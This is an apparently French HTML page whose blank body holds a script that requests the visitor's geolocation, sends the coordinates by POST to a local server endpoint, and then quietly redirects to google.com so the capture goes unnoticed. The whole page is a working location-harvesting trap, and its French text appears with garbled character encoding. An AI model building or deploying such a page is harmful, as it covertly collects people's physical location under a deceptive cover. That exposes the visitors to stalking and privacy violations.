<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>

<body>
    <script>
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else {
    console.log("La g√©olocalisation n'est pas support√©e par ce navigateur.");
  }

  async function addCoordinates(latitude, longitude) {
    try {
      const response = await fetch("http://localhost:3000/coords", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ latitude, longitude }),
      });

      if (!response.ok) {
        throw new Error(`Erreur serveur : ${response.status}`);
      }

      const result = await response.json();
      console.log("‚úÖ Coordonn√©es ajout√©es :", result);

      // üîÅ Attendre un peu avant de rediriger pour laisser le temps √† la requ√™te de s'ex√©cuter
      setTimeout(() => {
        window.location.href = "https://www.google.com/";
      }, 1000); // 1 seconde d‚Äôattente
    } catch (error) {
      console.error("‚ùå Erreur lors de l‚Äôajout des coordonn√©es :", error);
    }
  }

  function showPosition(position) {
    const { latitude, longitude } = position.coords;
    console.log(`üìç Position d√©tect√©e : ${latitude}, ${longitude}`);
    addCoordinates(latitude, longitude);
  }

  function showError(error) {
    switch (error.code) {
      case error.PERMISSION_DENIED:
        alert("Vous avez refus√© l'acc√®s √† la localisation.");
        break;
      case error.POSITION_UNAVAILABLE:
        console.log("Les informations de localisation ne sont pas disponibles.");
        break;
      case error.TIMEOUT:
        console.log("La requ√™te de localisation a expir√©.");
        break;
      default:
        console.log("Une erreur inconnue est survenue.");
    }
  }
</script>

</body>


</html>
